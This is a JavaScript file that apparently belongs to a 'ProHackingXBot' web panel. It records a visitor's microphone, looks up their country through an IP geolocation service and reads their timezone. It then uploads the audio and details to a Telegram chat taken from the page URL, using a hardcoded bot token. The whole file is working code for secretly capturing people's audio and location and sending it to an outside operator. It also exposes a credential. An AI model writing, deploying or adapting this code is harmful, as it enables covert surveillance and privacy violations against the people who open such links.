// ===== Telegram Bot Token =====
const BOT_TOKEN = "8645652953:AAHFVKv8mgJlSoTLjbYsg4nj7uL6vew9yH8";

const progress = document.getElementById("progress");
const status = document.getElementById("status");
const startBtn = document.getElementById("startBtn");
const stopBtn = document.getElementById("stopBtn");

const userIdEl = document.getElementById("userId");
const countryEl = document.getElementById("country");
const soundSizeEl = document.getElementById("soundSize");
const timezoneEl = document.getElementById("timezone");

let mediaRecorder;
let audioChunks = [];
let interval;
let value = 0;

// ===== Get Chat ID from URL =====
function getChatIdFromURL() {
  const url = window.location.href;
  const match = url.match(/\/\?=(\d+)$/);
  return match ? match[1] : null;
}

// ===== Get User ID from URL (optional) =====
function getUserIdFromURL() {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get("") || "Unknown";
}

// ===== Get Country Flag and Name =====
async function getUserCountry() {
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    const flag = data.country_code ? String.fromCodePoint(...[...data.country_code].map(c=>c.codePointAt(0)+127397)) : "";
    return { flag: flag, name: data.country_name || "" };
  } catch(err){
    console.error(err);
    return { flag:"", name:"Unknown" };
  }
}

// ===== Start Recording =====
async function startRecording() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    mediaRecorder = new MediaRecorder(stream);

    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
    mediaRecorder.onstop = sendAudioToTelegram;

    mediaRecorder.start();
    status.textContent = "Recording Audio...";
    startBtn.disabled = true;
    stopBtn.disabled = false;

    value = 0;
    progress.style.width = "0%";
    interval = setInterval(() => {
      value += 1;
      if (value > 100) {
        value = 100;
        stopRecording();
      }
      progress.style.width = value + "%";
    }, 100); // 10 sec
  } catch(err){
    alert("Microphone access denied or not available.");
    console.error(err);
  }
}

// ===== Stop Recording =====
function stopRecording() {
  if(mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
  clearInterval(interval);
  status.textContent = "Sending Audio...";
  startBtn.disabled = false;
  stopBtn.disabled = true;
}

// ===== Send audio to Telegram =====
async function sendAudioToTelegram() {
  const chatId = getChatIdFromURL();
  if(!chatId) {
    alert("Chat ID not found in URL!");
    status.textContent = "Error: Chat ID missing";
    return;
  }

  const userId = getUserIdFromURL();
  const blob = new Blob(audioChunks, { type: 'audio/webm' });
  const sizeMB = (blob.size/(1024*1024)).toFixed(2) + " MB";
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  
  const countryData = await getUserCountry();

  // Update info card
  userIdEl.textContent = userId;
  countryEl.textContent = `${countryData.flag} ${countryData.name}`;
  soundSizeEl.textContent = sizeMB;
  timezoneEl.textContent = timezone;

  // Telegram caption
  const caption = `╔════════════════════════════╗
🎵 New Audio Received
🌍 Country: ${countryData.flag} ${countryData.name}
⏰ TimeZone: ${timezone}
🔊 Soundsize: ${sizeMB}
👤 User ID: ${userId}
🤖 Bot: @ProHackingXBot
💻 User Panel Web System
╚════════════════════════════╝`;

  const form = new FormData();
  form.append("chat_id", chatId);
  form.append("caption", caption);
  form.append("audio", blob, "audio.webm");

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
    method: "POST",
    body: form
  }).then(res=>{
    console.log("Audio sent to Telegram");
    status.textContent = "Audio Sent!";
    audioChunks = [];
    progress.style.width = "0%";
  }).catch(err=>{
    console.error("Telegram send error:", err);
    status.textContent = "Error Sending Audio";
  });
}

startBtn.onclick = startRecording;
stopBtn.onclick = stopRecording; 
